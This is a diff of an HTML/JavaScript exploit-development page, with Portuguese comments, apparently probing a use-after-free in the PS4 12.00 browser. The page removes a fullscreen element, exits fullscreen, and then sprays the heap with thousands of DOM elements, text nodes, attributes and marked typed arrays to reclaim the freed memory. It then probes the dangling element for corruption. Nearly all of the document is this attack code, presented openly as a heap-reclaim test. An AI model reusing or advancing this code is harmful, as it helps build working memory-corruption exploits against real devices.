@@ -2,19 +2,21 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Aggressive Reclaim (Expanded Check)</title>
+<title>PS4 12.00 - UAF Aggressive Reclaim (Hybrid + Safe Log)</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>PS4 12.00 - UAF Aggressive Reclaim (Expanded Check)</h2>
+<h2>PS4 12.00 - UAF Aggressive Reclaim (Hybrid)</h2>
 <button onclick="runTest()">Run Test</button>
 
-<div id="log" style="margin-top:20px;"></div>
-
 <script>
+
+// 🔒 LOG SEGURO (fora do DOM)
+let logBuffer = [];
+
 function log(msg) {
     try { console.log(msg); } catch(e){}
-    document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
+    logBuffer.push(msg);
 }
 
 // ==========================
@@ -59,42 +61,52 @@ function setupFullscreen() {
 }
 
 // ==========================
-// 💣 AGGRESSIVE RECLAIM (INALTERADO)
+// 💣 AGGRESSIVE RECLAIM (COM TYPEDARRAY)
 // ==========================
 function aggressiveReclaim() {
     log("[*] Aggressive reclaim iniciado");
 
     let bucket = [];
 
-    for (let i = 0; i < 5000; i++) {
+    // Fase 1 — churn
+    for (let i = 0; i < 8000; i++) {
         let el = document.createElement("div");
         document.body.appendChild(el);
         el.remove();
     }
 
-    for (let i = 0; i < 5000; i++) {
+    // Fase 2 — Element spray
+    for (let i = 0; i < 10000; i++) {
         let el = document.createElement("div");
         el.innerHTML = "REUSE_EL_" + i;
-        el.style.position = "absolute";
-        el.style.width = "100%";
-        el.style.height = "100%";
         document.body.appendChild(el);
         bucket.push(el);
     }
 
-    for (let i = 0; i < 5000; i++) {
+    // 🔥 NOVO: TypedArray spray (controle de memória)
+    for (let i = 0; i < 10000; i++) {
+        let buf = new ArrayBuffer(0x100);
+        let view = new Uint32Array(buf);
+        view[0] = 0x41414141; // marcador
+        bucket.push(view);
+    }
+
+    // Fase 3 — TextNode
+    for (let i = 0; i < 10000; i++) {
         let txt = document.createTextNode("TXT_" + i);
         document.body.appendChild(txt);
         bucket.push(txt);
     }
 
-    for (let i = 0; i < 5000; i++) {
+    // Fase 4 — Attribute
+    for (let i = 0; i < 10000; i++) {
         let el = document.createElement("div");
         el.setAttribute("data-x", "ATTR_" + i);
         document.body.appendChild(el);
         bucket.push(el);
     }
 
+    // Fase 5 — churn final
     for (let i = 0; i < 5000; i++) {
         let el = document.createElement("span");
         document.body.appendChild(el);
@@ -111,76 +123,55 @@ function aggressiveReclaim() {
 function checkUAF(fsTarget) {
     log("---- CHECK UAF ----");
 
-    try {
-        log("[CHECK] innerHTML = " + fsTarget.innerHTML);
-    } catch(e) {
-        log("[UAF] innerHTML erro: " + e);
-    }
+    try { log("[CHECK] innerHTML = " + fsTarget.innerHTML); }
+    catch(e) { log("[UAF] innerHTML erro"); }
 
-    try {
-        log("[CHECK] outerHTML = " + fsTarget.outerHTML);
-    } catch(e) {
-        log("[UAF] outerHTML erro: " + e);
-    }
+    try { log("[CHECK] outerHTML = " + fsTarget.outerHTML); }
+    catch(e) { log("[UAF] outerHTML erro"); }
 
-    try {
-        log("[CHECK] id = " + fsTarget.id);
-    } catch(e) {
-        log("[UAF] id erro: " + e);
-    }
+    try { log("[CHECK] childNodes = " + fsTarget.childNodes.length); }
+    catch(e) { log("[UAF] childNodes erro"); }
 
-    try {
-        log("[CHECK] className = " + fsTarget.className);
-    } catch(e) {
-        log("[UAF] class erro: " + e);
-    }
+    try { log("[CHECK] firstChild = " + fsTarget.firstChild); }
+    catch(e) { log("[UAF] firstChild erro"); }
 
-    try {
-        log("[CHECK] childNodes.length = " + fsTarget.childNodes.length);
-    } catch(e) {
-        log("[UAF] childNodes erro: " + e);
-    }
-
-    try {
-        log("[CHECK] firstChild = " + fsTarget.firstChild);
-    } catch(e) {
-        log("[UAF] firstChild erro: " + e);
-    }
-
-    try {
-        log("[CHECK] data-x = " + fsTarget.getAttribute("data-x"));
-    } catch(e) {
-        log("[UAF] attribute erro: " + e);
-    }
+    try { log("[CHECK] data-x = " + fsTarget.getAttribute("data-x")); }
+    catch(e) { log("[UAF] attribute erro"); }
 }
 
 // ==========================
-// TRIGGER (INALTERADO + PATCH CHECKS)
+// TRIGGER (INALTERADO)
 // ==========================
 function trigger(fsTarget) {
-    log("[*] Trigger: remove + exitFullscreen");
+    log("[*] Trigger");
 
     try {
         fsTarget.remove();
 
         if (document.webkitIsFullScreen || document.fullscreenElement) {
-            document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
+            document.webkitExitFullscreen?.();
         }
 
     } catch(e) {
-        log("[ERRO] " + e);
+        log("[ERRO]");
     }
 
+    // janela crítica
     setTimeout(() => aggressiveReclaim(), 0);
     setTimeout(() => aggressiveReclaim(), 50);
     setTimeout(() => aggressiveReclaim(), 100);
 
-    // 🔬 CHECKS PROGRESSIVOS
+    // checks
     setTimeout(() => checkUAF(fsTarget), 10);
     setTimeout(() => checkUAF(fsTarget), 30);
     setTimeout(() => checkUAF(fsTarget), 60);
     setTimeout(() => checkUAF(fsTarget), 120);
     setTimeout(() => checkUAF(fsTarget), 250);
+
+    // 🔬 dump final seguro
+    setTimeout(() => {
+        alert(logBuffer.join("\n"));
+    }, 400);
 
     setTimeout(() => location.reload(), 500);
 }
@@ -189,20 +180,18 @@ function trigger(fsTarget) {
 // MAIN (INALTERADO)
 // ==========================
 function runTest() {
-    const logDiv = document.getElementById("log");
-    logDiv.innerHTML = "<p>Running... Press OPTIONS</p>";
-
     log("[*] Iniciando teste");
 
     let controllers = setupHeap();
     let fsTarget = setupFullscreen();
 
     window.onblur = function() {
-        log("[*] onblur disparado");
+        log("[*] onblur");
 
         setTimeout(() => trigger(fsTarget), 3000);
     };
 }
+
 </script>
 
 </body>
